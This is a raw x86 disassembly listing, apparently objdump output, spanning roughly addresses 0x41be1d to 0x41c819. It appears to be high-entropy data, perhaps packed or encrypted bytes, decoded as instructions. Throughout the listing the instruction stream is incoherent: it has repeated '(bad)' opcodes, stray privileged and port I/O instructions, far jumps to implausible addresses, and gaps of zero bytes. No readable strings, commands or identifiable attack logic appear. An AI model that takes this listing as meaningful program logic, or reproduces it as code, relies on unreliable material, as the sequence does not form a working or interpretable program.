  41be1d:	(bad)  
  41be1e:	xor    al,0xf3
  41be20:	retf   
  41be21:	jl     0x41bdc1
  41be23:	adc    ecx,DWORD PTR [edi]
  41be25:	cs loopne 0x41bdcb
  41be28:	add    eax,0x9b4d353c
  41be2d:	mov    DWORD PTR [ecx],esp
  41be2f:	sbb    eax,0x519f6d45
  41be34:	in     eax,dx
  41be35:	aam    0xcb
  41be37:	pop    esp
  41be38:	jne    0x41be11
  41be3a:	iret   
  41be3b:	and    bh,BYTE PTR [ebx]
  41be3d:	mov    edx,0x3fefd025
  41be42:	and    dl,BYTE PTR [ebp-0x55d14cc]
  41be48:	mov    bl,BYTE PTR [ecx+eiz*1-0x3e29e688]
  41be4f:	cdq    
  41be50:	ins    BYTE PTR es:[edi],dx
  41be51:	jnp    0x41be64
  41be53:	addr16 jne 0x41be06
  41be56:	ror    eax,1
  41be58:	mov    dh,0x4a
  41be5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be5b:	or     DWORD PTR [eax+0x16],eax
  41be5e:	push   0x22
  41be60:	xlat   BYTE PTR ds:[ebx]
  41be61:	jb     0x41be26
  41be63:	sbb    al,0xe3
  41be65:	ficom  WORD PTR [edi]
  41be67:	push   ss
  41be68:	dec    edi
  41be69:	push   0xffffff96
  41be6b:	je     0x41bdf9
  41be6d:	dec    eax
	...
  41bed6:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41bedc:	imul   edi
  41bede:	mov    ebp,DWORD PTR [ecx-0x204ec09a]
  41bee4:	mov    esi,0x12c675a
  41bee9:	add    BYTE PTR [eax],al
  41beeb:	add    DWORD PTR [eax],eax
  41beed:	add    BYTE PTR [ebx],dl
  41beef:	and    al,0xee
  41bef1:	icebp  
  41bef2:	bound  esp,QWORD PTR [ebx+0x63]
  41bef5:	mov    ds:0xcae55c30,al
  41befa:	sar    BYTE PTR [edi+eiz*2],1
  41befd:	jb     0x41bf6b
  41beff:	pop    eax
  41bf00:	mov    ds:0xd9483a3f,al
  41bf05:	test   eax,0x92666ec9
  41bf0a:	int3   
  41bf0b:	add    bl,BYTE PTR ds:0x54065465
  41bf11:	std    
  41bf12:	in     al,0xa3
  41bf14:	mov    dh,0x71
  41bf16:	pop    edi
  41bf17:	add    al,0x87
  41bf19:	jl     0x41bf7c
  41bf1b:	hlt    
  41bf1c:	xor    bl,BYTE PTR [esi+0x1b]
  41bf1f:	dec    ebx
  41bf20:	xor    DWORD PTR [ebx+0x68],esi
  41bf23:	xchg   esp,eax
  41bf24:	test   DWORD PTR [ebx+0x3b3e4b76],0x6b03a506
  41bf2e:	cwde   
  41bf2f:	pop    si
  41bf31:	shr    BYTE PTR [ebp-0x64],0x10
  41bf35:	xor    BYTE PTR [edx],cl
  41bf37:	jge    0x41bf63
  41bf39:	add    eax,0x8bed2205
  41bf3e:	mov    ah,0x29
  41bf40:	mul    BYTE PTR ds:0x5a0859a2
  41bf46:	pop    ss
  41bf47:	cdq    
  41bf48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf49:	loopne 0x41bed3
  41bf4b:	cdq    
  41bf4c:	lea    ebp,[edx+eax*4-0x12]
  41bf50:	nop
  41bf51:	xor    DWORD PTR [esp+edx*2],ecx
  41bf54:	pusha  
  41bf55:	pop    ebx
  41bf56:	ins    DWORD PTR es:[edi],dx
  41bf57:	xchg   ebx,eax
  41bf58:	inc    edx
  41bf59:	pop    ebx
  41bf5a:	scas   al,BYTE PTR es:[edi]
  41bf5b:	stos   DWORD PTR es:[edi],eax
  41bf5c:	pushf  
  41bf5d:	pushf  
  41bf5e:	mov    bh,0x15
  41bf60:	jmp    0x8ae98151
  41bf65:	mov    BYTE PTR [edx+0x2736f297],bh
  41bf6b:	push   ecx
  41bf6c:	fbld   TBYTE PTR [eax-0x59]
  41bf6f:	(bad)  
  41bf70:	gs in  eax,dx
  41bf72:	mov    edx,0x1079c2d4
  41bf77:	std    
  41bf78:	push   ecx
  41bf79:	(bad)  
  41bf7a:	push   ds
  41bf7b:	pop    ecx
  41bf7c:	fstp   st(2)
  41bf7e:	(bad)  
  41bf80:	xchg   esp,eax
  41bf81:	and    al,0xa0
  41bf83:	xchg   edi,eax
  41bf84:	cli    
  41bf85:	add    eax,0xbfe65019
  41bf8a:	gs push esi
  41bf8c:	cli    
  41bf8d:	adc    bh,BYTE PTR [eax+0x175ee2af]
  41bf93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf94:	sbb    DWORD PTR [edx],ebp
  41bf96:	fsubr  st(1),st
  41bf98:	sbb    al,0x73
  41bf9a:	les    edx,FWORD PTR [ebp-0xa]
  41bf9d:	inc    esp
  41bf9e:	inc    ecx
  41bf9f:	shl    BYTE PTR [esi-0x52],1
  41bfa2:	out    0xa8,al
  41bfa4:	into   
  41bfa5:	(bad)  
  41bfa6:	inc    esi
  41bfa7:	mov    DWORD PTR [edi+ebp*2-0x41],ebp
  41bfab:	es sbb ebp,ebp
  41bfae:	sbb    eax,0x84e39153
  41bfb3:	in     eax,dx
  41bfb4:	push   ds
  41bfb5:	repnz (bad) 
  41bfb7:	mov    ch,BYTE PTR [ebx+0x2aba3476]
  41bfbd:	mov    DWORD PTR [esi],esp
  41bfbf:	sahf   
  41bfc0:	or     ebp,0xffffff98
  41bfc3:	inc    edi
  41bfc4:	outs   dx,DWORD PTR ds:[esi]
  41bfc5:	adc    DWORD PTR [esi-0x3f],ecx
  41bfc8:	inc    edi
  41bfc9:	call   FWORD PTR [eax-0x50d770de]
  41bfcf:	mov    al,BYTE PTR [edi+0x53]
  41bfd2:	mov    DWORD PTR [edx],esi
  41bfd4:	sbb    ecx,DWORD PTR [ecx]
  41bfd6:	popa   
  41bfd7:	or     BYTE PTR ss:[ecx*2-0xa1b888a],0xa
  41bfe0:	cwde   
  41bfe1:	dec    eax
  41bfe2:	fldenv [edi+0x7263ecbc]
  41bfe8:	xchg   edx,eax
  41bfe9:	xor    BYTE PTR [esi],dh
  41bfeb:	xchg   ebp,eax
  41bfec:	int3   
  41bfed:	xor    BYTE PTR [eax],al
	...
  41c053:	add    BYTE PTR [eax],al
  41c055:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41c059:	es aaa 
  41c05b:	data16 jne 0x41c0d1
  41c05e:	ins    BYTE PTR es:[edi],dx
  41c05f:	daa    
  41c060:	mov    cl,0xc1
  41c062:	jle    0x41c0c0
  41c064:	push   esp
  41c065:	out    dx,al
  41c066:	addr16 sub eax,0x1000001
  41c06c:	add    BYTE PTR [eax],al
  41c06e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c06f:	jno    0x41c0b9
  41c071:	push   esp
  41c072:	xlat   BYTE PTR ds:[ebx]
  41c073:	(bad)  
  41c074:	xchg   esi,eax
  41c075:	mov    ch,0x4b
  41c077:	sbb    eax,0x193c063
  41c07c:	cmp    DWORD PTR [ebp+eax*2-0x64],esp
  41c080:	inc    esp
  41c081:	inc    edx
  41c082:	push   es
  41c083:	add    DWORD PTR [esi],0x76
  41c086:	rol    DWORD PTR es:[edx],1
  41c089:	into   
  41c08a:	sbb    eax,0xeccb177a
  41c08f:	shl    BYTE PTR [ecx],cl
  41c091:	add    BYTE PTR [eax-0x2b],ch
  41c094:	pop    ebx
  41c095:	jo     0x41c0bd
  41c097:	mov    BYTE PTR [esi-0x3b],bh
  41c09a:	jmp    FWORD PTR [esi]
  41c09c:	inc    eax
  41c09d:	lds    edi,FWORD PTR [ecx+0x730f73c7]
  41c0a3:	int3   
  41c0a4:	addr16 push es
  41c0a6:	lahf   
  41c0a7:	cli    
  41c0a8:	inc    DWORD PTR [ecx+edi*4]
  41c0ab:	mov    dh,0x57
  41c0ad:	jp     0x41c08e
  41c0af:	mov    ds:0xccae381f,eax
  41c0b4:	push   ds
  41c0b5:	pop    esi
  41c0b6:	int    0xfd
  41c0b8:	fild   WORD PTR [ecx]
  41c0ba:	fwait
  41c0bb:	push   0xffffffaa
  41c0bd:	pop    es
  41c0be:	mov    bh,0x88
  41c0c0:	add    cl,BYTE PTR [ebx]
  41c0c2:	sbb    DWORD PTR [ebx-0x469e3ee1],esi
  41c0c8:	and    eax,0x82bee2d0
  41c0cd:	pop    ebx
  41c0ce:	mov    esp,0xe65b850c
  41c0d3:	outs   dx,DWORD PTR ds:[esi]
  41c0d4:	push   ebp
  41c0d5:	push   edx
  41c0d6:	mov    eax,0x50972a4
  41c0db:	and    eax,0xd8836e5
  41c0e0:	push   cs
  41c0e1:	xchg   ebp,eax
  41c0e2:	outs   dx,DWORD PTR ds:[esi]
  41c0e3:	adc    eax,0xb81117e7
  41c0e8:	push   eax
  41c0e9:	cli    
  41c0ea:	cs jp  0x41c125
  41c0ed:	mov    DWORD PTR [ecx+eiz*4-0x4aac98b6],0x2498e141
  41c0f8:	pop    es
  41c0f9:	setns  bh
  41c0fc:	(bad)  
  41c0fd:	push   edx
  41c0fe:	push   ebp
  41c0ff:	aam    0x5a
  41c101:	rol    DWORD PTR [edx-0x1cde1db3],cl
  41c107:	xchg   DWORD PTR [ebx-0x80],ebp
  41c10a:	inc    esi
  41c10b:	cdq    
  41c10c:	imul   edx,DWORD PTR [eax],0xefd3be24
  41c112:	jle    0x41c0e1
  41c114:	xor    BYTE PTR [ebx-0x7a],bl
  41c117:	mov    ebx,0x2a7bdb6f
  41c11c:	stos   BYTE PTR es:[edi],al
  41c11d:	jns    0x41c17b
  41c11f:	and    WORD PTR [ebp-0x3c7697a4],sp
  41c126:	icebp  
  41c127:	jge    0x41c116
  41c129:	jne    0x41c12c
  41c12b:	shl    edx,cl
  41c12d:	test   eax,0x22b38a4c
  41c132:	rcl    DWORD PTR [edx-0x27],cl
  41c135:	cs mov ebx,0xe6df29b4
  41c13b:	mov    ebx,0xa226c915
  41c140:	lahf   
  41c141:	push   ss
  41c142:	and    BYTE PTR [edx-0x13a923ed],0x47
  41c149:	iret   
  41c14a:	lahf   
  41c14b:	xor    ah,bh
  41c14d:	nop
  41c14e:	xchg   DWORD PTR [ebx+0x20f477aa],esi
  41c154:	dec    ebp
  41c155:	jecxz  0x41c1b2
  41c157:	loop   0x41c13d
  41c159:	jge    0x41c109
  41c15b:	dec    esi
  41c15c:	dec    eax
  41c15d:	(bad)  
  41c15e:	clc    
  41c15f:	xor    al,0x8d
  41c161:	retf   0xb2a1
  41c164:	xchg   ebp,eax
  41c165:	pushf  
  41c166:	sti    
  41c167:	jmp    0x70493d50
  41c16c:	pushf  
  41c16d:	jb     0x41c16f
	...
  41c1d3:	add    BYTE PTR [eax],al
  41c1d5:	add    cl,bl
  41c1d7:	dec    edx
  41c1d8:	mov    eax,ds:0xd9fbb3f8
  41c1dd:	imul   edi,DWORD PTR ds:0x8ce90501,0xffffffaa
  41c1e4:	cmp    al,0xfe
  41c1e6:	add    DWORD PTR cs:[bx+si],eax
  41c1ea:	add    BYTE PTR [ecx],al
  41c1ec:	add    BYTE PTR [eax],al
  41c1ee:	mov    eax,ds:0xa0acce3b
  41c1f3:	in     al,0x40
  41c1f5:	repz and al,0xd
  41c1f8:	or     al,0x38
  41c1fa:	retf   0x212f
  41c1fd:	mov    ebp,0x378afbe2
  41c202:	sub    edi,DWORD PTR [ebx+ebx*4]
  41c205:	in     al,0x40
  41c207:	test   al,0xd0
  41c209:	aam    0x4f
  41c20b:	jp     0x41c256
  41c20d:	icebp  
  41c20e:	sub    ch,BYTE PTR [esi]
  41c210:	out    dx,eax
  41c211:	push   edi
  41c212:	xor    al,0x59
  41c214:	mov    al,ds:0x330a1c62
  41c219:	dec    ecx
  41c21a:	sar    DWORD PTR [esi],1
  41c21c:	pop    edx
  41c21d:	adc    ebx,ecx
  41c21f:	sbb    DWORD PTR [ebp-0x12],eax
  41c222:	imul   edx,DWORD PTR [eax-0x1d],0x7893fa51
  41c229:	push   eax
  41c22a:	xchg   ebp,eax
  41c22b:	fadd   st(6),st
  41c22d:	stos   DWORD PTR es:[edi],eax
  41c22e:	xchg   esi,eax
  41c22f:	push   edx
  41c230:	dec    ebx
  41c231:	jmp    0x41c24b
  41c233:	mov    dl,0xac
  41c235:	jo     0x41c2b1
  41c237:	cwde   
  41c238:	lds    esi,FWORD PTR [edx+0x21850fc7]
  41c23e:	icebp  
  41c23f:	ins    BYTE PTR es:[edi],dx
  41c240:	out    dx,al
  41c241:	(bad)  
  41c242:	mov    al,ds:0x6dbea3a2
  41c247:	ins    DWORD PTR es:[edi],dx
  41c248:	call   0x7f7a0ece
  41c24d:	push   es
  41c24e:	loope  0x41c211
  41c250:	outs   dx,DWORD PTR ds:[esi]
  41c251:	or     DWORD PTR [ebx],esi
  41c253:	xor    BYTE PTR [edi],cl
  41c255:	mov    dl,0xd8
  41c257:	stos   DWORD PTR es:[edi],eax
  41c258:	leave  
  41c259:	cmp    BYTE PTR [ecx-0x4fc79b1b],bl
  41c25f:	xchg   esp,eax
  41c260:	inc    esi
  41c261:	pop    edx
  41c262:	mov    al,ds:0xa37feb33
  41c267:	lds    edi,FWORD PTR [eax+0x4af0577a]
  41c26d:	mov    esi,0x897f08a6
  41c272:	adc    BYTE PTR ds:0x9c32a066,0x4a
  41c279:	sub    al,BYTE PTR [ecx+0x40e7588c]
  41c27f:	arpl   WORD PTR [esi-0x70eada0],dx
  41c285:	inc    ebp
  41c286:	mov    ebp,0xca129395
  41c28b:	lods   eax,DWORD PTR ds:[esi]
  41c28c:	call   0x74e17f3c
  41c291:	and    al,0x2b
  41c293:	xchg   esi,eax
  41c294:	pop    ebp
  41c295:	jne    0x41c263
  41c297:	jo     0x41c30b
  41c299:	scas   eax,DWORD PTR es:[edi]
  41c29a:	inc    esp
  41c29b:	jp     0x41c291
  41c29d:	or     BYTE PTR [ecx-0x26],ch
  41c2a0:	inc    edx
  41c2a1:	repz or DWORD PTR ds:0x56696e58,ebx
  41c2a8:	cmp    cl,BYTE PTR [esi]
  41c2aa:	mov    WORD PTR [ebx-0x2b],fs
  41c2ad:	mov    ecx,edi
  41c2af:	mov    ecx,0x74897a12
  41c2b4:	cs sub eax,ebx
  41c2b7:	out    dx,al
  41c2b8:	mov    dl,0xa2
  41c2ba:	dec    ebx
  41c2bb:	addr16 mov ebp,0x8b606bc5
  41c2c1:	rcl    DWORD PTR [ebp+0x5092fcae],0xc2
  41c2c8:	mov    ds:0xf18f49c,al
  41c2cd:	mov    bh,0xa8
  41c2cf:	xchg   DWORD PTR [edx-0x74869788],ecx
  41c2d5:	mov    bl,0x31
  41c2d7:	inc    ecx
  41c2d8:	inc    esi
  41c2d9:	sub    eax,0x2f5d6b29
  41c2de:	adc    BYTE PTR [ecx-0x11f7c5d9],al
  41c2e4:	test   ah,dh
  41c2e6:	iret   
  41c2e7:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2e9:	int    0x85
  41c2eb:	or     al,0xef
  41c2ed:	add    BYTE PTR fs:[eax],al
	...
  41c354:	add    BYTE PTR [eax],al
  41c356:	repz and ebp,ecx
  41c359:	push   ebp
  41c35a:	(bad)  
  41c35c:	sti    
  41c35d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c35e:	enter  0x1a95,0x14
  41c362:	mov    BYTE PTR [edi+0x1f],dl
  41c365:	sbb    esp,DWORD PTR [edi+0x2f]
  41c368:	add    DWORD PTR [eax],eax
  41c36a:	add    BYTE PTR [ecx],al
  41c36c:	add    BYTE PTR [eax],al
  41c36e:	popf   
  41c36f:	(bad)  
  41c372:	retf   0xcb0d
  41c375:	push   esp
  41c376:	add    ch,BYTE PTR [eax]
  41c378:	xchg   ebp,eax
  41c379:	fldcw  WORD PTR [eax]
  41c37b:	xchg   edi,eax
  41c37c:	retf   0x8f82
  41c37f:	and    al,0x17
  41c381:	dec    esp
  41c382:	sub    DWORD PTR [esi+0x25],ebp
  41c385:	mov    edi,es
  41c387:	aas    
  41c388:	jno    0x41c3a0
  41c38a:	lods   al,BYTE PTR ds:[esi]
  41c38b:	aaa    
  41c38c:	push   es
  41c38d:	pop    esi
  41c38e:	mov    ecx,0xf0e4870e
  41c393:	push   ebp
  41c394:	push   ecx
  41c395:	inc    edi
  41c396:	push   esp
  41c397:	dec    eax
  41c398:	fcomp  QWORD PTR [ebx]
  41c39a:	int3   
  41c39b:	push   esp
  41c39c:	fs jecxz 0x41c3a2
  41c39f:	mov    esi,0xc307a4ce
  41c3a4:	(bad)  
  41c3a5:	cmp    bl,BYTE PTR [ecx+0x565584f]
  41c3ab:	push   esi
  41c3ac:	gs ret 0xd8bd
  41c3b0:	popf   
  41c3b1:	mov    ch,0xb4
  41c3b3:	mov    gs,WORD PTR [ebp-0x1c6e56e7]
  41c3b9:	sub    ch,bl
  41c3bb:	adc    DWORD PTR [ebp+0x3],edx
  41c3be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c3bf:	outs   dx,DWORD PTR ds:[esi]
  41c3c0:	push   ss
  41c3c1:	mov    al,0x94
  41c3c3:	das    
  41c3c4:	cmp    BYTE PTR [ecx],0x69
  41c3c7:	jg     0x41c414
  41c3c9:	js     0x41c3a2
  41c3cb:	adc    DWORD PTR [ecx+ecx*4-0x7],0xffffffc4
  41c3d0:	adc    DWORD PTR [ebx-0x3e5475e8],esp
  41c3d6:	jmp    0xfdbcc505
  41c3db:	js     0x41c3d0
  41c3dd:	imul   edi,DWORD PTR [edi+0x3a],0xdb8d90a0
  41c3e4:	jmp    0x41c449
  41c3e6:	mov    ah,0x10
  41c3e8:	jb     0x41c42b
  41c3ea:	jmp    0x76ea6e89
  41c3ef:	adc    DWORD PTR [edi-0x3f0bb499],ebp
  41c3f5:	or     eax,0x84965c3f
  41c3fa:	cwde   
  41c3fb:	add    bl,bl
  41c3fd:	xlat   BYTE PTR ds:[ebx]
  41c3fe:	or     BYTE PTR [ecx+eax*4+0x3acdffa0],0x27
  41c406:	arpl   WORD PTR [ecx],bx
  41c408:	bound  esp,QWORD PTR [eax]
  41c40a:	jbe    0x41c41d
  41c40c:	int3   
  41c40d:	mov    ecx,0x3b4eecfd
  41c412:	les    ebx,FWORD PTR [ecx]
  41c414:	fcom   DWORD PTR [esi]
  41c416:	mov    BYTE PTR [eax+edi*2],ch
  41c419:	fdiv   st,st(1)
  41c41b:	xchg   ecx,eax
  41c41c:	test   DWORD PTR ds:[eax-0x78ceb06a],esi
  41c423:	push   ss
  41c424:	push   ebp
  41c425:	cwde   
  41c426:	rol    ah,cl
  41c428:	(bad)  
  41c429:	gs push esi
  41c42b:	xlat   BYTE PTR ds:[ebx]
  41c42c:	mov    ah,0xaf
  41c42e:	test   al,0x2b
  41c430:	pop    ds
  41c431:	pushf  
  41c432:	pop    edx
  41c433:	hlt    
  41c434:	or     eax,0x61517df0
  41c439:	add    al,0x8a
  41c43b:	(bad)  
  41c43c:	mov    dl,0x45
  41c43e:	add    DWORD PTR [eax],eax
  41c440:	adc    eax,0xd2dfe63d
  41c445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c446:	mov    eax,0x1c09f9c0
  41c44b:	retf   0x269b
  41c44e:	mov    ds:0x3c2520eb,eax
  41c453:	mov    esi,0x3edfbe1a
  41c458:	pop    ss
  41c459:	push   eax
  41c45a:	fadd   DWORD PTR [ebx]
  41c45c:	cli    
  41c45d:	popf   
  41c45e:	test   BYTE PTR [edi-0x36015f47],ah
  41c464:	xor    DWORD PTR [edx+0xd],edi
  41c467:	ins    DWORD PTR es:[edi],dx
  41c468:	mov    dl,0x72
  41c46a:	sub    bl,BYTE PTR [edx+0x79e6]
	...
  41c4d4:	add    BYTE PTR [eax],al
  41c4d6:	push   ebx
  41c4d7:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c4dd:	std    
  41c4de:	mov    bl,0x35
  41c4e0:	dec    ebp
  41c4e1:	push   ecx
  41c4e2:	mov    eax,ds:0x6731f90c
  41c4e7:	xor    BYTE PTR [ecx],al
  41c4e9:	add    BYTE PTR [eax],al
  41c4eb:	add    DWORD PTR [eax],eax
  41c4ed:	add    BYTE PTR [edx+0x3d],dh
  41c4f0:	lods   al,BYTE PTR ds:[esi]
  41c4f1:	inc    ebx
  41c4f2:	xchg   ecx,eax
  41c4f3:	stc    
  41c4f4:	into   
  41c4f5:	fnsave [edi+0x6483d778]
  41c4fb:	mov    bh,0xf0
  41c4fd:	iret   
  41c4fe:	add    esp,ebp
  41c500:	out    dx,eax
  41c501:	popa   
  41c502:	and    bl,0xec
  41c505:	mov    ecx,DWORD PTR [edi+0x59483867]
  41c50b:	jge    0x41c563
  41c50d:	(bad)  
  41c50e:	shl    DWORD PTR [edi],1
  41c510:	mov    cl,0x1
  41c512:	jle    0x41c532
  41c514:	pop    ss
  41c515:	cwde   
  41c516:	popa   
  41c517:	xchg   DWORD PTR [edi-0x5e],eax
  41c51a:	push   cs
  41c51b:	popa   
  41c51c:	int3   
  41c51d:	ja     0x41c529
  41c51f:	add    DWORD PTR [ebx],ecx
  41c521:	popa   
  41c522:	add    DWORD PTR [eax-0x62ab48f2],edx
  41c528:	sub    DWORD PTR [ebx-0x5a9f9e16],ebp
  41c52e:	nop
  41c52f:	mov    edx,0x714187b1
  41c534:	xchg   esi,eax
  41c535:	call   0x8052af8c
  41c53a:	imul   esp,DWORD PTR [ebx-0x3b423792],0x1758e0dd
  41c544:	pop    ecx
  41c545:	jne    0x41c585
  41c547:	dec    edi
  41c548:	xchg   ecx,eax
  41c549:	dec    edi
  41c54a:	mov    ebx,0x9505aa2d
  41c54f:	ds mov esp,0x2b41f2b2
  41c555:	mov    eax,ds:0xdbbb17ce
  41c55a:	pop    ebx
  41c55b:	adc    eax,0xabc21994
  41c560:	test   ecx,eax
  41c562:	push   cs
  41c563:	imul   DWORD PTR [ecx+0x53]
  41c566:	addr16 ret 0xd7c6
  41c56a:	int3   
  41c56b:	xlat   BYTE PTR fs:[ebx]
  41c56d:	stos   DWORD PTR es:[edi],eax
  41c56e:	and    DWORD PTR [ebx-0x35bf1b23],edx
  41c574:	dec    eax
  41c575:	jle    0x41c5bf
  41c577:	pop    esp
  41c578:	mov    ecx,ecx
  41c57a:	jmp    0xafcb:0x4d4542f0
  41c581:	add    BYTE PTR [ebp+0x2a],bl
  41c584:	jmp    0x41c50c
  41c586:	mov    eax,ds:0x150e797a
  41c58b:	aam    0x9
  41c58d:	mov    ebp,0x1dd66d39
  41c592:	into   
  41c593:	test   al,0xcf
  41c595:	add    DWORD PTR [eax],ecx
  41c597:	push   ecx
  41c598:	outs   dx,DWORD PTR ds:[esi]
  41c599:	cld    
  41c59a:	xchg   esp,eax
  41c59b:	inc    edi
  41c59c:	stos   DWORD PTR es:[edi],eax
  41c59d:	jno    0x41c5f3
  41c59f:	mov    esp,0x405e6eb5
  41c5a4:	xor    ch,bl
  41c5a6:	icebp  
  41c5a7:	ret    
  41c5a8:	sub    BYTE PTR [ebp+0x13],dl
  41c5ab:	push   ds
  41c5ac:	mov    esi,0x98ab1211
  41c5b1:	ficom  DWORD PTR [edi]
  41c5b3:	(bad)  
  41c5b4:	fild   QWORD PTR [ebp-0x5a]
  41c5b7:	mov    cl,0x5e
  41c5b9:	cli    
  41c5ba:	les    edi,FWORD PTR [esi]
  41c5bc:	dec    ebp
  41c5bd:	xor    BYTE PTR [esi],cl
  41c5bf:	push   0x5989f324
  41c5c4:	add    ah,0x19
  41c5c7:	into   
  41c5c8:	dec    esp
  41c5c9:	xor    ebx,ecx
  41c5cb:	inc    ebp
  41c5cc:	ret    0xec27
  41c5cf:	mov    eax,0xaf789787
  41c5d4:	mov    bl,0xf7
  41c5d6:	fcom   DWORD PTR [ebp+eax*8-0x71]
  41c5da:	(bad)  [edx]
  41c5dc:	cmc    
  41c5dd:	mov    gs,WORD PTR ds:0x7c151de1
  41c5e3:	xor    cl,dl
  41c5e5:	sub    DWORD PTR [esi],0x5501a615
  41c5eb:	ja     0x41c5a2
  41c5ed:	xor    DWORD PTR [eax],eax
	...
  41c653:	add    BYTE PTR [eax],al
  41c655:	add    ch,al
  41c657:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c65d:	jecxz  0x41c6a2
  41c65f:	and    ch,ch
  41c661:	call   0x3167:0xbcbddf33
  41c668:	add    DWORD PTR [eax],eax
  41c66a:	add    BYTE PTR [ecx],al
  41c66c:	add    BYTE PTR [eax],al
  41c66e:	ror    BYTE PTR [edx],cl
  41c670:	cmp    al,0x5e
  41c672:	adc    BYTE PTR [ebx+0x431da685],dl
  41c678:	sub    DWORD PTR [ecx-0x17dd9e2d],ebp
  41c67e:	pop    ecx
  41c67f:	jb     0x41c67f
  41c681:	pop    ebp
  41c682:	imul   DWORD PTR [edi-0x10]
  41c685:	fbstp  TBYTE PTR [ebx-0xd4ef685]
  41c68b:	xchg   edi,eax
  41c68c:	(bad)  
  41c68d:	cmp    ah,BYTE PTR [edi+0xf]
  41c690:	outs   dx,DWORD PTR ds:[esi]
  41c691:	popf   
  41c692:	jae    0x41c712
  41c694:	mov    dl,0xb6
  41c696:	add    dh,BYTE PTR [bp+di+0x17]
  41c69a:	adc    BYTE PTR [edx],al
  41c69c:	fisttp QWORD PTR [esi-0x1c8a18c5]
  41c6a2:	dec    ecx
  41c6a3:	js     0x41c6fb
  41c6a5:	inc    esi
  41c6a6:	mov    ds:0x22ebd07f,eax
  41c6ab:	mov    esp,0x1e8bc30d
  41c6b0:	jecxz  0x41c67e
  41c6b2:	push   cs
  41c6b3:	xor    eax,0x1f8b5bd3
  41c6b8:	(bad)  
  41c6b9:	cmp    DWORD PTR [ebp+0x5bc4059d],esp
  41c6bf:	rcl    BYTE PTR [edi+0xb],0xf6
  41c6c3:	mov    ecx,DWORD PTR gs:[eax+0x1985dfaf]
  41c6ca:	fs dec ebx
  41c6cc:	loope  0x41c669
  41c6ce:	add    al,0x76
  41c6d0:	jmp    0x41c724
  41c6d2:	out    dx,al
  41c6d3:	jo     0x41c6a8
  41c6d5:	loope  0x41c6a4
  41c6d7:	add    BYTE PTR [eax],al
  41c6d9:	mov    al,0xf
  41c6db:	and    al,0xbb
  41c6de:	jg     0x41c6ba
  41c6e0:	fcmovnu st,st(5)
  41c6e2:	ins    DWORD PTR es:[edi],dx
  41c6e3:	jge    0x41c6f7
  41c6e5:	ret    
  41c6e6:	mov    gs,WORD PTR [eax+0x2]
  41c6e9:	mov    DWORD PTR [eax+0x51b0a92e],edi
  41c6ef:	xchg   bl,ch
  41c6f1:	jge    0x41c678
  41c6f3:	dec    ebx
  41c6f4:	ins    DWORD PTR es:[edi],dx
  41c6f5:	dec    DWORD PTR [edx]
  41c6f7:	outs   dx,BYTE PTR ds:[esi]
  41c6f8:	xor    DWORD PTR [ebx],esi
  41c6fa:	cwde   
  41c6fb:	push   0x7409e968
  41c700:	inc    eax
  41c701:	push   edi
  41c702:	div    BYTE PTR [ebx+0x4f]
  41c705:	jae    0x41c781
  41c707:	cdq    
  41c708:	mov    dh,0x44
  41c70a:	neg    DWORD PTR [ecx]
  41c70c:	push   ebp
  41c70d:	ret    
  41c70e:	je     0x41c751
  41c710:	sbb    al,0xed
  41c712:	(bad)  
  41c713:	in     al,0x92
  41c715:	sub    DWORD PTR [ebx],eax
  41c717:	js     0x41c6c5
  41c719:	test   BYTE PTR [edx+0x47],bl
  41c71c:	cmp    ah,BYTE PTR [esi+0x318087]
  41c722:	jecxz  0x41c73b
  41c724:	adc    al,BYTE PTR [ecx+ebx*8+0x3a]
  41c728:	or     ah,bh
  41c72a:	adc    DWORD PTR [edi-0xe],esi
  41c72d:	push   ebp
  41c72e:	pop    ebp
  41c72f:	lods   eax,DWORD PTR ds:[esi]
  41c730:	cmp    cl,BYTE PTR [ebx-0x26]
  41c733:	lods   eax,DWORD PTR ds:[esi]
  41c734:	leave  
  41c735:	es pop ecx
  41c737:	jne    0x41c798
  41c739:	inc    esi
  41c73a:	add    bl,bh
  41c73c:	xchg   edi,eax
  41c73d:	popf   
  41c73e:	inc    ecx
  41c73f:	xor    eax,0x3823703b
  41c744:	pop    ecx
  41c745:	push   ecx
  41c746:	repz add eax,0x339ec39f
  41c74c:	test   DWORD PTR ds:0x504c9f49,0x7031a2cc
  41c756:	and    al,0x4f
  41c758:	enter  0x839e,0x95
  41c75c:	stos   BYTE PTR es:[edi],al
  41c75d:	xchg   ebx,eax
  41c75e:	xchg   ebx,eax
  41c75f:	ret    
  41c760:	sub    DWORD PTR [edi],0x1db81845
  41c766:	je     0x41c7bb
  41c768:	sbb    DWORD PTR [ebp-0x3c],esi
  41c76b:	add    cl,bl
  41c76d:	xchg   esi,eax
	...
  41c7d6:	fiadd  DWORD PTR [ecx]
  41c7d8:	ret    0xdb86
  41c7db:	(bad)  
  41c7dc:	ficomp WORD PTR [ebp-0xf]
  41c7df:	cmp    DWORD PTR [esi],esi
  41c7e1:	lahf   
  41c7e2:	fldenv [ecx+0xa]
  41c7e5:	sbb    esp,DWORD PTR [edi+0x32]
  41c7e8:	add    DWORD PTR [eax],eax
  41c7ea:	add    BYTE PTR [ecx],al
  41c7ec:	add    BYTE PTR [eax],al
  41c7ee:	add    eax,0x2855a9b
  41c7f3:	add    al,0xaa
  41c7f5:	jle    0x41c83a
  41c7f7:	fldz   
  41c7f9:	xchg   DWORD PTR [ecx+0x1d],edx
  41c7fc:	push   cs
  41c7fd:	jmp    0x41c793
  41c7ff:	mov    bl,0xff
  41c801:	in     al,dx
  41c802:	sbb    DWORD PTR [edx-0x1b],0xf1aab926
  41c809:	into   
  41c80a:	ret    0x457b
  41c80d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c80e:	add    bl,BYTE PTR [ebx]
  41c810:	fisub  WORD PTR [edi]
  41c812:	adc    bh,BYTE PTR [edi+esi*8-0x258dc98e]
  41c819:	push   DWORD PTR [esi]
